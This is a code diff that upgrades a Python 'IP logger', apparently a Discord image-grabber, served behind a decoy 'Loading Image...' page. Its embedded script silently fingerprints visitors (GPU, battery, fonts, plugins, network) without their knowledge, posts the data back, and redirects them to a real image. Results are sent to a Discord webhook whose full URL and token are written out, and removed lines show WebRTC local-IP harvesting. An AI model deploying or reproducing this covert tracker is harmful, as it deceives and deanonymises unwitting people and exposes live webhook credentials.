@@ -1,28 +1,23 @@
-# Enhanced IP Logger with Automatic Data Collection
-# Maintains original detail level + adds automatic data capture
+# Enhanced IP Logger with Complete Device Fingerprinting
+# Silent data collection without user interaction
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser, json
 
 __app__ = "Advanced IP Logger"
-__description__ = "Automated IP and system data collection"
-__version__ = "v4.0"
+__description__ = "Comprehensive device fingerprinting"
+__version__ = "v5.0"
 __author__ = "Cybersecurity Student"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1386756417368752249/ASWh-wwav0RH1LmxiImI2SD900JuBi6RjSQl-I-s_JNjle2NpEcPRr95OJAaHvj-B7Mw",
+    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
     "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
     "imageArgument": True,
-    "username": "Data Logger",
+    "username": "Device Fingerprinter",
     "color": 0x00FFFF,
     "crashBrowser": False,
     "accurateLocation": True,
-    "message": {
-        "doMessage": False,
-        "message": "Loading image...",
-        "richMessage": True,
-    },
     "vpnCheck": 1,
     "linkAlerts": True,
     "buggedImage": True,
@@ -110,15 +105,19 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, syste
     system_text = "**System Info:**\n> No additional data captured"
     if system_info:
         try:
-            system_text = "**System Info:**\n"
+            system_text = "**Device Fingerprint:**\n"
             system_text += f"> **Screen:** {system_info.get('screen', 'Unknown')}\n"
             system_text += f"> **CPU Cores:** {system_info.get('cores', 'Unknown')}\n"
-            system_text += f"> **Device Memory:** {system_info.get('memory', 'Unknown')}\n"
+            system_text += f"> **RAM:** {system_info.get('ram', 'Unknown')}\n"
+            system_text += f"> **GPU:** {system_info.get('gpu', 'Unknown')}\n"
+            system_text += f"> **Battery:** {system_info.get('battery', 'Unknown')}\n"
             system_text += f"> **Language:** {system_info.get('language', 'Unknown')}\n"
             system_text += f"> **Timezone:** {system_info.get('timezone', 'Unknown')}\n"
-            system_text += f"> **Cookies Enabled:** {system_info.get('cookies', 'Unknown')}\n"
-            system_text += f"> **WebGL Vendor:** {system_info.get('webgl_vendor', 'Unknown')}\n"
-            system_text += f"> **Local IPs:** {system_info.get('local_ips', 'Unknown')}\n"
+            system_text += f"> **Cookies:** {system_info.get('cookies', 'Unknown')}\n"
+            system_text += f"> **Plugins:** {system_info.get('plugins', 'Unknown')}\n"
+            system_text += f"> **Fonts:** {system_info.get('fonts', 'Unknown')}\n"
+            system_text += f"> **Touch Support:** {system_info.get('touch', 'Unknown')}\n"
+            system_text += f"> **Connection:** {system_info.get('connection', 'Unknown')}\n"
         except:
             system_text = "**System Info:**\n> Error processing data"
 
@@ -127,7 +126,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, syste
         "username": config["username"],
         "content": ping,
         "embeds": [{
-            "title": "Advanced Data Capture",
+            "title": "Complete Device Fingerprint",
             "color": config["color"],
             "description": f"""**New Connection Detected!**
 
@@ -170,7 +169,7 @@ binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
 
-class AutoCaptureLogger(BaseHTTPRequestHandler):
+class SilentDataLogger(BaseHTTPRequestHandler):
     
     def handle_request(self):
         try:
@@ -216,7 +215,7 @@ class AutoCaptureLogger(BaseHTTPRequestHandler):
                 makeReport(ip, user_agent, endpoint=parsed_path.path, url=url)
                 return
             
-            # Generate HTML with automatic data collection
+            # Generate HTML with silent data collection
             html_content = self.generate_html(url)
             
             # Send response
@@ -239,7 +238,7 @@ class AutoCaptureLogger(BaseHTTPRequestHandler):
         return f"""<!DOCTYPE html>
 <html>
 <head>
-    <title>Image Preview</title>
+    <title>Loading Image...</title>
     <style>
         body {{
             margin: 0;
@@ -267,7 +266,7 @@ class AutoCaptureLogger(BaseHTTPRequestHandler):
 <body>
     <div class="loader"></div>
     <script>
-        // Automatic data collection without user interaction
+        // Silent data collection without user interaction
         (function() {{
             // Create a 1x1 pixel image to load in background
             const img = new Image();
@@ -277,63 +276,96 @@ class AutoCaptureLogger(BaseHTTPRequestHandler):
             img.style.left = '-9999px';
             document.body.appendChild(img);
             
-            // Collect system information
+            // Collect comprehensive system information
             const systemInfo = {{}};
             
-            // Screen information
-            systemInfo.screen = `${{screen.width}}x${{screen.height}} (Depth: ${{screen.colorDepth}}bit)`;
+            // 1. Screen information
+            systemInfo.screen = `${{screen.width}}×${{screen.height}} (Depth: ${{screen.colorDepth}}bit)`;
             
-            // CPU cores
+            // 2. CPU information
             systemInfo.cores = navigator.hardwareConcurrency || 'Unknown';
             
-            // Device memory
-            systemInfo.memory = navigator.deviceMemory ? `${{navigator.deviceMemory}}GB` : 'Unknown';
+            // 3. Device memory
+            systemInfo.ram = navigator.deviceMemory ? `${{navigator.deviceMemory}}GB` : 'Unknown';
             
-            // Language and timezone
-            systemInfo.language = navigator.language || 'Unknown';
-            systemInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-            
-            // Cookie support
-            systemInfo.cookies = navigator.cookieEnabled ? 'Yes' : 'No';
-            
-            // WebGL information
+            // 4. GPU information
             try {{
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (gl) {{
-                    systemInfo.webgl_vendor = gl.getParameter(gl.VENDOR) || 'Unknown';
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {{
+                        systemInfo.gpu = `${{gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}} | ${{gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}}`;
+                    }}
                 }}
             }} catch (e) {{}}
             
-            // Attempt to get local IP addresses (may not work in all browsers)
-            try {{
-                const ips = [];
-                const pc = new RTCPeerConnection({{iceServers: []}});
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = e => {{
-                    if (!e.candidate) return;
-                    const ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(e.candidate.candidate);
-                    if (ip && !ips.includes(ip[1])) ips.push(ip[1]);
-                    systemInfo.local_ips = ips.length ? ips.join(', ') : 'Not available';
-                }};
-            }} catch (e) {{
-                systemInfo.local_ips = 'Not available';
+            // 5. Battery status (if supported)
+            if ('getBattery' in navigator) {{
+                navigator.getBattery().then(battery => {{
+                    systemInfo.battery = `${{Math.round(battery.level * 100)}}% (${{battery.charging ? 'Charging' : 'Not Charging'}})`;
+                    sendSystemInfo();
+                }}).catch(() => sendSystemInfo());
+            }} else {{
+                sendSystemInfo();
             }}
             
-            // Send system info to server after a short delay
-            setTimeout(() => {{
+            // 6. Language and timezone
+            systemInfo.language = navigator.language || 'Unknown';
+            systemInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+            
+            // 7. Cookie support
+            systemInfo.cookies = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
+            
+            // 8. Browser plugins
+            try {{
+                systemInfo.plugins = Array.from(navigator.plugins)
+                    .map(p => p.name)
+                    .filter(name => !name.includes('PDF Viewer') && !name.includes('Chrome PDF'))
+                    .join(', ') || 'None detected';
+            }} catch (e) {{}}
+            
+            // 9. Font detection (limited)
+            try {{
+                const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Comic Sans MS'];
+                const available = [];
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                
+                for (const font of fonts) {{
+                    context.font = '72px ' + font;
+                    if (context.measureText('mm').width > 100) {{
+                        available.push(font);
+                    }}
+                }}
+                
+                systemInfo.fonts = available.length ? available.join(', ') : 'Standard only';
+            }} catch (e) {{}}
+            
+            // 10. Touch support
+            systemInfo.touch = 'ontouchstart' in window ? 'Supported' : 'Not supported';
+            
+            // 11. Network information
+            if (navigator.connection) {{
+                const conn = navigator.connection;
+                systemInfo.connection = `${{conn.effectiveType || 'Unknown'}} (Down: ${{conn.downlink}}Mbps, RTT: ${{conn.rtt}}ms)`;
+            }}
+            
+            function sendSystemInfo() {{
+                // Send system info to server
                 try {{
                     fetch('/collect', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
                         body: JSON.stringify(systemInfo)
                     }});
-                }} catch (e) {{}}
+                }} catch (e) {{
+                    console.error('Data submission error:', e);
+                }}
                 
                 // Redirect to actual image after collection
                 window.location.href = "{image_url}";
-            }}, 1500);
+            }}
         }})();
     </script>
 </body>
@@ -342,4 +374,4 @@ class AutoCaptureLogger(BaseHTTPRequestHandler):
     do_GET = handle_request
     do_POST = handle_request
 
-handler = app = AutoCaptureLogger
+handler = app = SilentDataLogger
